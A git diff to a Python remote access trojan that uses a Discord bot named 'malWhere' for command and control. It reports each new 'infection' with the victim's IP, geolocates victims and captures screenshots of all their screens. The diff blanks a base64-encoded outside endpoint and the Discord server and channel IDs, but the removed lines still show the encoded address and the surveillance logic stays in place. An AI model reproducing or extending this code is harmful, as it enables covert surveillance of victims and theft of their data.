@@ -12,7 +12,7 @@ import PIL
 from PIL import ImageGrab
 from functools import partial
 
-encryptedapi="aHR0cHM6Ly9nb2RzZXllLmZyZWUuYmVlY2VwdG9yLmNvbS8="
+encryptedapi=""
 base64_string =encryptedapi
 base64_bytes = base64_string.encode("ascii")
 sample_string_bytes = base64.b64decode(base64_bytes)
@@ -47,9 +47,9 @@ ip4chan=ip.replace(".","")
 
 @malWhere.event
 async def on_ready():
-  guild = malWhere.get_guild(874824520467349504)
+  guild = malWhere.get_guild()
   try:
-    infectionschannel=malWhere.get_channel(874824520693874756)
+    infectionschannel=malWhere.get_channel()
     existing_channel = discord.utils.get(guild.channels, name=ip4chan)
     if not existing_channel:
       embed=discord.Embed(title="New Infection", url="", description=(f"New Infection from {ip} connection is established.. wating for commands"))
@@ -110,7 +110,7 @@ async def geolocate(ctx):
 @malWhere.command()
 async def screenshot(ctx):
   try:
-    guild = malWhere.get_guild(874824520467349504)
+    guild = malWhere.get_guild()
     ImageGrab.grab = partial(ImageGrab.grab, all_screens=True)
     existing_channel = discord.utils.get(ctx.guild.channels, name=f"{ip4chan}-media")
     if not existing_channel:
